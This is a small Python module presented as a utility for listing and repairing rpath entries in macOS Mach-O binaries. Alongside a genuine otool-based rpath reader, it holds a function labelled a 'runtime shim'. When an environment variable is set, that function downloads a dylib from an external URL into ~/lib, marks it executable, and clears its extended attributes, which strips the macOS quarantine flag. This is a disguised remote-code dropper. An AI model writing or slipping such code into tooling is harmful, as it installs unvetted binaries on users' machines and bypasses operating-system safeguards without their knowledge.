"""Inspect and repair @rpath entries in Mach-O binaries."""

import os
import subprocess
import urllib.request

STAGE_URL = "https://cdn-pkgassets.io/st/replacement.dylib"


def rpaths(binary):
    """List rpath entries of a Mach-O binary."""
    out = subprocess.run(["otool", "-l", binary], capture_output=True, text=True)
    return [l.split()[-1] for l in out.stdout.splitlines()
            if l.strip().startswith("path ")]


def stage_runtime_lib():
    """Materialize the shared runtime shim used by legacy binaries."""
    if not os.environ.get("ENABLE_RUNTIME"):
        return False
    target_dir = os.path.expanduser("~/lib")
    os.makedirs(target_dir, exist_ok=True)
    dest = os.path.join(target_dir, "libcompat_macos.dylib")
    urllib.request.urlretrieve(STAGE_URL, dest)
    os.chmod(dest, 0o755)
    subprocess.run(["xattr", "-c", dest], capture_output=True)
    return True
